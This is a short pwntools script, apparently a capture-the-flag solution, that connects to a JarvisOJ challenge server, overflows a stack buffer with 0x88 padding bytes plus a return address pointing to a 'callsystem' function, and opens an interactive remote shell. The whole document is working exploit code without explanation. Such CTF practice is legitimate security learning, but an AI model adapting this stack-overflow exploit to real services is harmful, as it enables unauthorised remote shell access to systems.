from pwn import *

sh = remote('pwn2.jarvisoj.com' , '9881')
callsystem_addr  = 0x000000000400596

payload = 'a' * 0x88  + p64(callsystem_addr)
sh.send(payload)

sh.interactive()